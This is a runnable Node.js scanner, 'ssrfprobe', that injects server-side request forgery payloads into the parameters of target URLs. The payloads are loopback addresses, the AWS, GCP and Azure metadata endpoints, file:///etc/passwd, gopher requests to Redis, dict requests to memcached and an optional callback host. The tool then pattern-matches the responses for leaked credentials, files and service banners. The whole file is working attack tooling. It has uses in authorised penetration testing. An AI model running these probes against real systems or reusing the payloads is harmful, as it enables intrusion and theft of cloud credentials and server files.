#!/usr/bin/env node
// ssrfprobe.js — SSRF indicator tester with OOB-friendly payloads.
// Copyright (c) 2026 0xnothings
// @tool ssrfprobe
// @desc Inject internal/loopback URLs into params to spot SSRF: timing, error text and metadata echoes
// @usage node tools/ssrfprobe.js "https://site.com/fetch?url=1" --json
// @tags security,web,ssrf
import { args, get, num, flag, die, inputLines, table } from '../_lib.js';

const o = args(process.argv.slice(2));
if (o.f.help) {
  console.log(`ssrfprobe — SSRF indicator tester

  node tools/ssrfprobe.js <url|urls.txt|-> [options]

  --params <list>   params to inject if none present (default: url,uri,path,dest,target,redirect,next,host,site)
  --oob <host>      your collaborator host for blind SSRF (e.g. abc.oast.fun)
  --timeout <ms>    request timeout (default: 10000)
  --json            machine-readable output
  -h, --help        this text`);
  process.exit(0);
}

const OOB = o.f.oob ? String(get(o, 'oob')) : null;
const PAYLOADS = [
  ['loopback', 'http://127.0.0.1:80/'],
  ['loopback-alt', 'http://127.1:80/'],
  ['localhost', 'http://localhost:80/'],
  ['metadata-aws', 'http://169.254.169.254/latest/meta-data/'],
  ['metadata-gcp', 'http://metadata.google.internal/computeMetadata/v1/'],
  ['metadata-azure', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'],
  ['file', 'file:///etc/passwd'],
  ['gopher', 'gopher://127.0.0.1:6379/_INFO'],
  ['dict', 'dict://127.0.0.1:11211/stat'],
];
if (OOB) PAYLOADS.push(['oob-http', `http://${OOB}/ssrf`], ['oob-https', `https://${OOB}/ssrf`]);

const SIGNALS = [
  [/root:.*:0:0:/, 'file disclosure (/etc/passwd)'],
  [/ami-id|instance-id|iam\/security-credentials/, 'AWS metadata leak'],
  [/computeMetadata|project-id|service-accounts/, 'GCP metadata leak'],
  [/(?:"vmId"|"subscriptionId"|azure)/i, 'Azure metadata leak'],
  [/Connection refused|ECONNREFUSED|Failed to connect/i, 'internal connection error text'],
  [/Redis version|# Server|redis_version/i, 'redis banner over gopher/dict'],
  [/^STAT |STAT items/i, 'memcached STAT response'],
];

function inject(raw, param, value) {
  const u = new URL(raw); u.searchParams.set(param, value); return u.toString();
}

async function send(url, timeout) {
  const ctl = new AbortController(); const t = setTimeout(() => ctl.abort(), timeout);
  const t0 = Date.now();
  try {
    const res = await fetch(url, { signal: ctl.signal, redirect: 'manual', headers: { 'user-agent': '0xnothings-ssrf/1.0' } });
    const body = await res.text().catch(() => '');
    return { ms: Date.now() - t0, status: res.status, body, len: body.length, ctype: res.headers.get('content-type') || '' };
  } catch (e) { return { ms: Date.now() - t0, error: e.name === 'AbortError' ? 'timeout' : String(e.cause?.code || e.message) }; }
  finally { clearTimeout(t); }
}

let entries = o._.length ? o._ : ['-'];
let urls = [];
for (const e of entries) if (/-$|\.txt$/.test(e)) urls.push(...(await inputLines(e))); else urls.push(e);
urls = [...new Set(urls.map((u) => (/^https?:\/\//.test(u) ? u : 'https://' + u)))];
if (!urls.length) die('no url given');
const timeout = num(get(o, 'timeout'), 10000);

const findings = [];
for (const raw of urls) {
  let params = [...new URL(raw).searchParams.keys()];
  if (!params.length) params = String(get(o, 'params', 'url,uri,path,dest,target,redirect,next,host,site,fetch,src,link')).split(',').map((s) => s.trim());
  params = [...new Set(params)];
  const baseline = await send(raw, timeout);
  for (const p of params) for (const [label, payload] of PAYLOADS) {
    const r = await send(inject(raw, p, payload), timeout);
    const signals = [];
    if (r.body) for (const [re, why] of SIGNALS) if (re.test(r.body)) signals.push(why);
    if (!r.error && baseline.ms > 0 && r.ms > baseline.ms * 3 && r.ms > 1500) signals.push(`timing ${baseline.ms}ms -> ${r.ms}ms`);
    if (r.error && /ECONNREFUSED|ENOTFOUND|timeout/.test(r.error) && label.startsWith('metadata')) signals.push(`edge error: ${r.error}`);
    if (!signals.length) continue;
    findings.push({ url: raw, param: p, payload: label, status: r.status ?? r.error, signals: signals.join('; ') });
    if (!flag(o, 'json')) console.log(`${raw}\n  param=${p} payload=${label}  -> ${signals.join('; ')}`);
  }
}
if (flag(o, 'json')) console.log(JSON.stringify(findings, null, 2));
else {
  if (OOB) console.log(`\nblind SSRF: check your listener for hits from ${OOB}`);
  console.log(`${findings.length} SSRF indicator(s) on ${urls.length} url(s)`);
}
